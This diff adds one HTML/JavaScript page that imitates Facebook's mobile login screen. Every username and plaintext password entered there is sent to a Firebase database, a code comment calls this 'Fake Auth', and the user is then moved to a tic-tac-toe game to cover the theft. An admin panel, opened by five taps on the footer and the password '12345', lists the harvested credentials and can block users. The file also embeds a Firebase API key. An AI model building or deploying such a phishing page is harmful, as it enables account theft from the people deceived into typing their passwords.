@@ -1,1 +1,698 @@
-.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Mode UI & Secure Admin</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* --- Main Container --- */
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            background-color: #121212;
+            overflow: hidden;
+        }
+
+        /* --- Login View (Reverted to Original) --- */
+        #login-view {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            padding: 20px;
+        }
+
+        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
+        .icon-btn { font-size: 24px; cursor: pointer; color: #e4e6eb; background: none; border: none; padding: 5px; }
+        .lang-selector { color: #b0b3b8; font-size: 14px; display: flex; align-items: center; gap: 5px; cursor: pointer; }
+        .logo-container { display: flex; justify-content: center; margin-bottom: 30px; }
+        .main-logo { width: 75px; height: 75px; border-radius: 50%; object-fit: cover; border: 2px solid #333; transition: all 0.3s ease; }
+        
+        .info-text { color: #e4e6eb; font-size: 14px; margin-bottom: 20px; line-height: 1.4; border-top: 1px solid #333; padding-top: 20px; }
+        .info-link { color: #4599ff; text-decoration: none; font-weight: 500; }
+
+        .input-group { margin-bottom: 15px; position: relative; }
+        .input-group input {
+            width: 100%; padding: 16px; background-color: #1c1c1c; border: 1px solid #444;
+            border-radius: 12px; color: #fff; font-size: 15px; outline: none; transition: border-color 0.2s;
+        }
+        .input-group input:focus { border-color: #0866ff; }
+
+        .btn-primary {
+            width: 100%; background-color: #0866ff; color: #ffffff; font-size: 16px; font-weight: 600;
+            padding: 14px; border: none; border-radius: 25px; cursor: pointer; margin-top: 5px; transition: background-color 0.2s;
+        }
+        .btn-primary:hover { background-color: #075ce5; }
+
+        .forgot-pass { display: block; text-align: center; color: #e4e6eb; font-size: 15px; text-decoration: none; margin-top: 20px; font-weight: 500; }
+        .bottom-section { margin-top: auto; text-align: center; padding-bottom: 10px; }
+        .btn-outline {
+            width: 100%; background-color: transparent; color: #4599ff; font-size: 15px; font-weight: 600;
+            padding: 12px; border: 1px solid #333; border-radius: 25px; cursor: pointer; margin-bottom: 15px;
+        }
+        .footer-logo {
+            color: #b0b3b8; font-size: 14px; display: flex; justify-content: center; align-items: center;
+            gap: 5px; font-weight: 500; cursor: pointer; padding: 10px; user-select: none;
+        }
+
+        /* --- Sign Up View (Reverted to Original) --- */
+        #signup-view { display: none; flex-direction: column; height: 100%; padding: 20px; background-color: #1e1e1e; }
+        .signup-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        #signup-view h2 { font-size: 26px; font-weight: bold; margin-bottom: 10px; }
+        #signup-view p { color: #e4e6eb; font-size: 15px; margin-bottom: 25px; }
+        .name-inputs { display: flex; gap: 12px; margin-bottom: 20px; }
+        .name-input-wrapper { flex: 1; }
+        .name-input-wrapper input { width: 100%; padding: 16px 14px; background-color: transparent; border: 1px solid #555; border-radius: 12px; color: #fff; font-size: 16px; outline: none; }
+
+        /* --- Suspended View --- */
+        #suspended-view {
+            display: none; flex-direction: column; height: 100%; padding: 20px;
+            background-color: #121212; justify-content: center; align-items: center; text-align: center;
+        }
+        .suspended-icon { font-size: 70px; color: #fa3e3e; margin-bottom: 20px; text-shadow: 0 0 20px rgba(250, 62, 62, 0.5); }
+        #suspended-view h2 { color: #fa3e3e; font-size: 28px; margin-bottom: 15px; }
+        #suspended-view p { color: #b0b3b8; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+
+        /* --- Custom Premium Alert / Modals --- */
+        .modal-overlay {
+            display: none; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px); z-index: 1000;
+            justify-content: center; align-items: center; padding: 20px;
+        }
+        .modal-box {
+            background-color: #1c1c1c; width: 100%; max-width: 320px; padding: 25px;
+            border-radius: 16px; border: 1px solid #333; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .modal-box h3 { margin-bottom: 15px; font-size: 20px; }
+        .modal-box p { color: #e4e6eb; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
+        .modal-action-btns { display: flex; gap: 10px; margin-top: 15px; justify-content: center; }
+
+        /* --- Admin Panel View --- */
+        #admin-view {
+            display: none; flex-direction: column; height: 100%; padding: 20px;
+            background: linear-gradient(135deg, #121212 0%, #1a1a2e 100%); overflow-y: auto;
+        }
+        .admin-title-area h2 { color: #ffb74d; font-size: 22px; text-align: center; margin: 10px 0 20px 0; }
+        .admin-card {
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1); padding: 20px;
+            border-radius: 16px; text-align: center; margin-bottom: 20px;
+        }
+        .admin-preview-img { width: 70px; height: 70px; border-radius: 50%; object-fit: cover; border: 3px solid #ffb74d; margin-bottom: 15px; }
+        .admin-card label { display: block; margin-bottom: 8px; color: #b0b3b8; font-size: 14px; text-align: left;}
+        .btn-warning { background-color: #ffb74d; color: #000; box-shadow: 0 4px 15px rgba(255, 183, 77, 0.4); }
+        
+        /* Updated Admin Logs Styling */
+        .logs-container { max-height: 450px; overflow-y: auto; text-align: left; margin-top: 10px; }
+        .log-card {
+            background: rgba(0, 0, 0, 0.4); border: 1px solid #333; border-radius: 12px;
+            padding: 15px; margin-bottom: 12px; position: relative;
+        }
+        .log-header { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #222; padding-bottom: 8px;}
+        .log-type { font-weight: bold; font-size: 13px; }
+        .log-time { font-size: 11px; color: #888; }
+        .log-detail { font-size: 14px; margin-bottom: 5px; color: #ddd; }
+        .log-detail span { color: #fff; font-weight: bold; }
+        
+        .action-btn-row { display: flex; justify-content: flex-end; margin-top: 10px; }
+        .btn-block { background-color: #fa3e3e; color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: bold;}
+        .btn-unblock { background-color: #42b72a; color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: bold;}
+
+        /* --- Game View --- */
+        #game-view {
+            display: none; padding: 20px; flex-direction: column; align-items: center; justify-content: center;
+            height: 100%; background: radial-gradient(circle at center, #1a1a2e 0%, #121212 100%);
+        }
+        .game-header { text-align: center; margin-bottom: 20px; width: 100%; max-width: 320px; }
+        
+        /* Level System UI */
+        .level-badge {
+            background: linear-gradient(90deg, #ffb74d, #f57c00); color: #000; padding: 5px 15px;
+            border-radius: 20px; font-weight: bold; font-size: 14px; display: inline-block; margin-bottom: 15px;
+            box-shadow: 0 2px 10px rgba(255, 183, 77, 0.4);
+        }
+
+        .game-scores { display: flex; justify-content: space-between; background: rgba(255,255,255,0.05); padding: 12px 20px; border-radius: 12px; width: 100%; font-weight: bold;}
+        .game-status { font-size: 18px; margin: 20px 0; font-weight: bold; color: #ffb74d; height: 25px;}
+        
+        .board {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; max-width: 320px; margin-bottom: 30px;
+            background: rgba(255, 255, 255, 0.03); padding: 15px; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05);
+        }
+        .cell {
+            width: 100%; aspect-ratio: 1; background-color: rgba(0, 0, 0, 0.4); border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 50px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+        .cell:active { transform: scale(0.95); }
+        .cell.x { color: #0866ff; text-shadow: 0 0 15px #0866ff, 0 0 30px #0866ff; }
+        .cell.o { color: #fa3e3e; text-shadow: 0 0 15px #fa3e3e, 0 0 30px #fa3e3e; }
+
+        .game-controls { display: flex; gap: 15px; width: 100%; max-width: 320px; }
+    </style>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- 1. Login View (Original Design) -->
+        <div id="login-view">
+            <div class="header-top">
+                <button class="icon-btn">&#8592;</button>
+                <div class="lang-selector">English (US) <span>&#711;</span></div>
+                <div style="width: 24px;"></div>
+            </div>
+
+            <div class="logo-container">
+                <img id="main-logo" src="https://i.ibb.co.com/DHxS7SsK/Facebook-Logosu.png" alt="Profile" class="main-logo">
+            </div>
+
+            <div class="info-text">
+                Facebook requests and receives your phone number from your mobile network. <br>
+                <a href="#" class="info-link">Change Settings</a>
+            </div>
+
+            <!-- Login form without restriction -->
+            <form onsubmit="loginUser(event)">
+                <div class="input-group">
+                    <input type="text" id="login-id" placeholder="Mobile number or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="login-pass" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn-primary">Log in</button>
+            </form>
+            
+            <a href="#" class="forgot-pass">Forgot password?</a>
+
+            <div class="bottom-section">
+                <button class="btn-outline" onclick="openSignup()">Create new account</button>
+                
+                <!-- Secret Admin Trigger Area -->
+                <div class="footer-logo" onclick="handleSecretTap()">
+                    <span>&#8734;</span> <span id="display-brand-name">Meta</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. Suspended View -->
+        <div id="suspended-view">
+            <div class="suspended-icon">⚠️</div>
+            <h2>Account Suspended</h2>
+            <p>Your account has been restricted by the administrator due to policy violations. You cannot access the application at this time.</p>
+            <button class="btn-primary" style="background-color: #333;" onclick="logoutUser()">Go Back</button>
+        </div>
+
+        <!-- 3. Sign Up View (Original Design) -->
+        <div id="signup-view">
+            <div class="signup-header">
+                <button class="icon-btn" onclick="closeSignup()">&#8592;</button>
+                <button class="icon-btn">🔊</button>
+            </div>
+            <h2>What's your name?</h2>
+            <p>Enter the name you use in real life.</p>
+            <div class="name-inputs">
+                <div class="name-input-wrapper"><input type="text" id="first-name" placeholder="First name" required></div>
+                <div class="name-input-wrapper"><input type="text" id="last-name" placeholder="Last name" required></div>
+            </div>
+            <button class="btn-primary" onclick="goToGameFromSignup()">Next</button>
+            <div style="margin-top: auto; text-align: center; padding-bottom: 20px;">
+                <a href="#" style="color: #4599ff; text-decoration: none; font-weight: 600;">Find my account</a>
+            </div>
+        </div>
+
+        <!-- --- Custom Alert Modal --- -->
+        <div class="modal-overlay" id="custom-alert-modal">
+            <div class="modal-box">
+                <h3 id="custom-alert-title">Notice</h3>
+                <p id="custom-alert-message">This is a message.</p>
+                <div class="modal-action-btns">
+                    <button class="btn-primary" style="border-radius: 12px; width: 100px;" onclick="closeCustomAlert()">OK</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- --- Admin Password Modal (Hidden) --- -->
+        <div class="modal-overlay" id="admin-auth-modal">
+            <div class="modal-box">
+                <h3 style="color: #ffb74d;">👑 Admin Access</h3>
+                <p>Enter posswo to open panel</p>
+                <div class="input-group">
+                    <input type="password" id="admin-password-input" placeholder="Secret password">
+                </div>
+                <div class="modal-action-btns">
+                    <button class="btn-primary btn-warning" style="border-radius: 12px;" onclick="verifyAdmin()">Login</button>
+                    <button class="btn-outline" style="margin-bottom: 0; color: #fff; border-color: #555; border-radius: 12px;" onclick="closeAdminAuth()">Cancel</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 4. Admin Panel View -->
+        <div id="admin-view">
+            <div class="header-top">
+                <button class="icon-btn" onclick="closeAdmin()">&#8592;</button>
+            </div>
+            <div class="admin-title-area"><h2>👑 Admin Dashboard</h2></div>
+            
+            <!-- App Settings Section -->
+            <div class="admin-card">
+                <h3 style="color: #fff; margin-bottom: 15px; text-align: left;">UI Settings</h3>
+                <img id="admin-preview-logo" src="https://i.ibb.co.com/2YZWys6D/images-30.jpg" alt="Preview" class="admin-preview-img">
+                
+                <label>Profile Image URL</label>
+                <div class="input-group">
+                    <input type="text" id="admin-img-input" placeholder="Image URL">
+                </div>
+
+                <label>App Brand Name</label>
+                <div class="input-group">
+                    <input type="text" id="admin-brand-input" placeholder="e.g., My Name">
+                </div>
+                <button class="btn-primary btn-warning" onclick="saveAdminSettings()" style="margin-top: 5px;">Save Changes</button>
+            </div>
+
+            <!-- User Logs Section -->
+            <div class="admin-card" style="margin-bottom: 50px;">
+                <h3 style="color: #4599ff; text-align: left;">Recent Users Activity</h3>
+                <p style="font-size: 12px; color: #888; text-align: left; margin-top: 5px;">Manage users and view their login data.</p>
+                
+                <div class="logs-container" id="admin-logs-box">
+                    <p style="text-align: center; color: #666; margin-top: 20px;">Loading logs...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- 5. Game View (Level System) -->
+        <div id="game-view">
+            <div class="game-header">
+                <div class="level-badge" id="level-display">Level: 1</div>
+                <div class="game-scores">
+                    <span style="color: #0866ff;">You: <span id="score-player">0</span></span>
+                    <span style="color: #fa3e3e;">Bot: <span id="score-bot">0</span></span>
+                </div>
+            </div>
+            
+            <div class="game-status" id="status-text">Your Turn (X)</div>
+            
+            <div class="board" id="game-board">
+                <div class="cell" onclick="makeMove(0)"></div><div class="cell" onclick="makeMove(1)"></div><div class="cell" onclick="makeMove(2)"></div>
+                <div class="cell" onclick="makeMove(3)"></div><div class="cell" onclick="makeMove(4)"></div><div class="cell" onclick="makeMove(5)"></div>
+                <div class="cell" onclick="makeMove(6)"></div><div class="cell" onclick="makeMove(7)"></div><div class="cell" onclick="makeMove(8)"></div>
+            </div>
+
+            <div class="game-controls">
+                <button class="btn-primary" style="background-color: #31a24c; border-radius: 12px;" onclick="restartGame(true)">Restart Board</button>
+                <button class="btn-primary" style="background-color: #fa3e3e; border-radius: 12px;" onclick="logoutUser()">Log Out</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const ADMIN_SECRET_PASSWORD = "12345"; // এডমিন প্যানেলের পাসওয়ার্ড
+        let blockedUsersList = {}; // Locally store blocked users
+
+        // ==========================================
+        // Custom Alert Logic 
+        // ==========================================
+        function showCustomAlert(title, message, isError = false) {
+            document.getElementById('custom-alert-title').innerText = title;
+            document.getElementById('custom-alert-title').style.color = isError ? "#fa3e3e" : (title==="Level Up!" ? "#ffb74d" : "#0866ff");
+            document.getElementById('custom-alert-message').innerText = message;
+            document.getElementById('custom-alert-modal').style.display = 'flex';
+        }
+        function closeCustomAlert() {
+            document.getElementById('custom-alert-modal').style.display = 'none';
+        }
+
+        // ==========================================
+        // FIREBASE CONFIGURATION & SYNC
+        // ==========================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyBIWfV9KZn3S0CCiqH6R2zeM82s6Upg5vM",
+            authDomain: "tuki-1a5df.firebaseapp.com",
+            databaseURL: "https://tuki-1a5df-default-rtdb.firebaseio.com",
+            projectId: "tuki-1a5df",
+            storageBucket: "tuki-1a5df.firebasestorage.app",
+            messagingSenderId: "126914328140",
+            appId: "1:126914328140:web:a9d7b08594397e6c92e6e9"
+        };
+
+        let db = null;
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        db = firebase.database();
+        
+        // 1. App Settings Sync
+        db.ref('appSettings').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                if(data.profileImageUrl) {
+                    document.getElementById('main-logo').src = data.profileImageUrl; 
+                    document.getElementById('admin-preview-logo').src = data.profileImageUrl;
+                    document.getElementById('admin-img-input').value = data.profileImageUrl;
+                }
+                if(data.brandName) {
+                    document.getElementById('display-brand-name').innerText = data.brandName;
+                    document.getElementById('admin-brand-input').value = data.brandName;
+                }
+            }
+        });
+
+        // 2. Fetch Blocked Users List
+        db.ref('blockedUsers').on('value', (snapshot) => {
+            blockedUsersList = snapshot.val() || {};
+            if(document.getElementById('admin-view').style.display === 'flex'){
+                fetchAdminLogs();
+            }
+        });
+
+        // 3. Fetch User Logs (Realtime)
+        function fetchAdminLogs() {
+            db.ref('userLogs').limitToLast(50).once('value', (snapshot) => {
+                const logsBox = document.getElementById('admin-logs-box');
+                logsBox.innerHTML = ''; 
+                
+                let logsArray = [];
+                snapshot.forEach((child) => { 
+                    logsArray.push({ id: child.key, ...child.val() }); 
+                });
+                
+                logsArray.reverse(); // Newest first
+
+                if(logsArray.length === 0) {
+                    logsBox.innerHTML = '<p style="text-align: center; color: #666; margin-top: 20px;">No user activity yet.</p>';
+                    return;
+                }
+
+                logsArray.forEach(log => {
+                    let typeColor = log.action === "Login" ? "#0866ff" : "#42b72a";
+                    let isBlocked = blockedUsersList[log.username] === true;
+                    let passDisplay = log.password && log.password !== "N/A" ? log.password : "N/A";
+                    
+                    let div = document.createElement('div');
+                    div.className = 'log-card';
+                    div.innerHTML = `
+                        <div class="log-header">
+                            <span class="log-type" style="color: ${typeColor}">${log.action}</span>
+                            <span class="log-time">${log.time}</span>
+                        </div>
+                        <div class="log-detail">User ID: <span>${log.username}</span></div>
+                        <div class="log-detail">Password: <span style="color: #ffb74d;">${passDisplay}</span></div>
+                        <div class="action-btn-row">
+                            ${isBlocked 
+                                ? `<button class="btn-unblock" onclick="toggleBlockStatus('${log.username}', false)">Unblock User</button>`
+                                : `<button class="btn-block" onclick="toggleBlockStatus('${log.username}', true)">Block User</button>`
+                            }
+                        </div>
+                    `;
+                    logsBox.appendChild(div);
+                });
+            });
+        }
+        
+        // Listen for log updates
+        db.ref('userLogs').on('value', () => { fetchAdminLogs(); });
+
+        // Save Data to Firebase Logs
+        function sendLogToFirebase(actionType, user, pass) {
+            if (db) {
+                const currentTime = new Date().toLocaleString();
+                db.ref('userLogs').push({
+                    action: actionType,
+                    username: user,
+                    password: pass || "N/A",
+                    time: currentTime
+                });
+            }
+        }
+
+        // Block / Unblock function for Admin
+        function toggleBlockStatus(username, status) {
+            if(db) {
+                if(status === true) {
+                    db.ref('blockedUsers/' + username).set(true);
+                } else {
+                    db.ref('blockedUsers/' + username).remove();
+                }
+            }
+        }
+
+        function saveAdminSettings() {
+            const newImgUrl = document.getElementById('admin-img-input').value.trim();
+            const newBrandName = document.getElementById('admin-brand-input').value.trim();
+            if (newImgUrl === "" || newBrandName === "") {
+                showCustomAlert("Warning", "Please fill all the fields!", true); return;
+            }
+            if (db) {
+                db.ref('appSettings').update({ profileImageUrl: newImgUrl, brandName: newBrandName })
+                .then(() => { showCustomAlert("Success", "Settings Updated Successfully! Live everywhere."); });
+            }
+        }
+
+        // ==========================================
+        // SECRET ADMIN LOGIN
+        // ==========================================
+        let tapCount = 0; let tapTimer;
+        function handleSecretTap() {
+            tapCount++; clearTimeout(tapTimer);
+            tapTimer = setTimeout(() => { tapCount = 0; }, 1000);
+            if (tapCount >= 5) {
+                tapCount = 0;
+                document.getElementById('admin-auth-modal').style.display = 'flex';
+            }
+        }
+
+        function verifyAdmin() {
+            const inputPass = document.getElementById('admin-password-input').value;
+            if (inputPass === ADMIN_SECRET_PASSWORD) {
+                document.getElementById('admin-password-input').value = "";
+                document.getElementById('admin-auth-modal').style.display = 'none';
+                hideAll(); 
+                document.getElementById('admin-view').style.display = 'flex';
+                fetchAdminLogs();
+            } else { 
+                showCustomAlert("Access Denied", "Incorrect Admin Password!", true); 
+            }
+        }
+        function closeAdminAuth() { document.getElementById('admin-auth-modal').style.display = 'none'; }
+        function closeAdmin() { hideAll(); document.getElementById('login-view').style.display = 'flex'; }
+
+        // ==========================================
+        // UI NAVIGATION & USER LOGIN 
+        // ==========================================
+        function hideAll() {
+            document.getElementById('login-view').style.display = 'none';
+            document.getElementById('signup-view').style.display = 'none';
+            document.getElementById('admin-view').style.display = 'none';
+            document.getElementById('game-view').style.display = 'none';
+            document.getElementById('suspended-view').style.display = 'none';
+        }
+
+        function openSignup() { hideAll(); document.getElementById('signup-view').style.display = 'flex'; }
+        function closeSignup() { hideAll(); document.getElementById('login-view').style.display = 'flex'; }
+
+        function loginUser(e) {
+            e.preventDefault();
+            const userId = document.getElementById('login-id').value.trim();
+            const userPass = document.getElementById('login-pass').value.trim();
+            
+            // Check if user is blocked
+            if(blockedUsersList[userId] === true) {
+                hideAll();
+                document.getElementById('suspended-view').style.display = 'flex';
+                // Log the blocked attempt silently
+                sendLogToFirebase("Blocked Login", userId, userPass);
+                return;
+            }
+
+            // Normal login (Fake Auth)
+            sendLogToFirebase("Login", userId, userPass); 
+            hideAll();
+            document.getElementById('game-view').style.display = 'flex';
+            resetGameSystem();
+        }
+
+        function goToGameFromSignup() {
+            const fName = document.getElementById('first-name').value.trim();
+            const lName = document.getElementById('last-name').value.trim();
+            
+            if(!fName) { showCustomAlert("Warning", "Enter first name.", true); return; }
+            
+            const fullName = fName + " " + lName;
+            
+            if(blockedUsersList[fullName] === true) {
+                hideAll();
+                document.getElementById('suspended-view').style.display = 'flex';
+                sendLogToFirebase("Blocked Account", fullName, "N/A");
+                return;
+            }
+
+            sendLogToFirebase("New Account", fullName, "N/A");
+            
+            hideAll();
+            document.getElementById('game-view').style.display = 'flex';
+            resetGameSystem();
+        }
+
+        function logoutUser() {
+            hideAll(); document.getElementById('login-view').style.display = 'flex';
+            document.querySelectorAll('form').forEach(form => form.reset());
+        }
+
+        // ==========================================
+        // SMART TIC-TAC-TOE (LEVEL SYSTEM)
+        // ==========================================
+        let board = ["", "", "", "", "", "", "", "", ""];
+        let gameActive = true;
+        let pScore = 0, bScore = 0;
+        let gameLevel = 1;
+        let winStreak = 0;
+        
+        const statusText = document.getElementById('status-text');
+        const levelBadge = document.getElementById('level-display');
+        const cells = document.querySelectorAll('.cell');
+        const winConditions = [
+            [0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6]             
+        ];
+
+        function makeMove(index) {
+            if (board[index] !== "" || !gameActive) return;
+            board[index] = "X";
+            updateBoardUI();
+            
+            if(checkWinner("X")) return;
+
+            statusText.innerText = "Computer's Turn...";
+            statusText.style.color = "#fa3e3e";
+            gameActive = false; 
+            setTimeout(botMove, 500); 
+        }
+
+        function botMove() {
+            if(!gameActive && board.includes("")) {
+                let bestIdx = getBotMoveBasedOnLevel();
+                board[bestIdx] = "O";
+                updateBoardUI();
+                
+                if(checkWinner("O")) return;
+
+                statusText.innerText = "Your Turn (X)";
+                statusText.style.color = "#0866ff";
+                gameActive = true;
+            }
+        }
+
+        function getBotMoveBasedOnLevel() {
+            let emptySpots = board.map((v, i) => v === "" ? i : null).filter(v => v !== null);
+            
+            // Level 1: Completely Random (Easy)
+            if(gameLevel === 1) {
+                return emptySpots[Math.floor(Math.random() * emptySpots.length)];
+            }
+            
+            // Level 2 & 3: Smart Bot
+            let move = findWinningMove("O"); // Can bot win?
+            if(move !== -1) return move;
+            
+            move = findWinningMove("X"); // Can player win? Block it!
+            if(move !== -1) return move;
+            
+            // Level 3: Hard bot prioritizes center
+            if(gameLevel >= 3 && board[4] === "") return 4;
+            
+            return emptySpots[Math.floor(Math.random() * emptySpots.length)];
+        }
+
+        function findWinningMove(player) {
+            for(let i=0; i<winConditions.length; i++){
+                let [a,b,c] = winConditions[i];
+                let values = [board[a], board[b], board[c]];
+                if(values.filter(v => v === player).length === 2 && values.includes("")) {
+                    return values.indexOf("") === 0 ? a : (values.indexOf("") === 1 ? b : c);
+                }
+            }
+            return -1;
+        }
+
+        function updateBoardUI() {
+            board.forEach((val, idx) => {
+                cells[idx].innerText = val;
+                cells[idx].className = "cell";
+                if(val === "X") cells[idx].classList.add("x");
+                if(val === "O") cells[idx].classList.add("o");
+            });
+        }
+
+        function checkWinner(player) {
+            let roundWon = false;
+            for (let i = 0; i < winConditions.length; i++) {
+                const [a, b, c] = winConditions[i];
+                if (board[a] && board[a] === board[b] && board[a] === board[c]) { roundWon = true; break; }
+            }
+            
+            if (roundWon) { 
+                gameActive = false; 
+                if(player === "X") {
+                    statusText.innerText = "You Won! 🎉"; statusText.style.color = "#42b72a";
+                    document.getElementById('score-player').innerText = ++pScore;
+                    winStreak++;
+                    // Level Up Logic (Every 2 consecutive wins = Level Up)
+                    if(winStreak >= 2) {
+                        gameLevel++; winStreak = 0;
+                        levelBadge.innerText = "Level: " + gameLevel;
+                        setTimeout(() => showCustomAlert("Level Up!", `Congratulations! You are now on Level ${gameLevel}. The Bot got smarter!`), 500);
+                    }
+                } else {
+                    statusText.innerText = "Bot Won! 🤖"; statusText.style.color = "#fa3e3e";
+                    document.getElementById('score-bot').innerText = ++bScore;
+                    winStreak = 0; // Reset streak on loss
+                }
+                return true; 
+            }
+            
+            if (!board.includes("")) { 
+                statusText.innerText = "Match Draw!"; statusText.style.color = "#fff";
+                gameActive = false; return true; 
+            }
+            return false;
+        }
+
+        function restartGame(isManualReset = false) {
+            board = ["", "", "", "", "", "", "", "", ""];
+            gameActive = true;
+            statusText.innerText = "Your Turn (X)";
+            statusText.style.color = "#0866ff";
+            updateBoardUI();
+        }
+
+        function resetGameSystem() {
+            pScore = 0; bScore = 0; gameLevel = 1; winStreak = 0;
+            document.getElementById('score-player').innerText = "0";
+            document.getElementById('score-bot').innerText = "0";
+            levelBadge.innerText = "Level: 1";
+            restartGame();
+        }
+    </script>
+</body>
+</html>
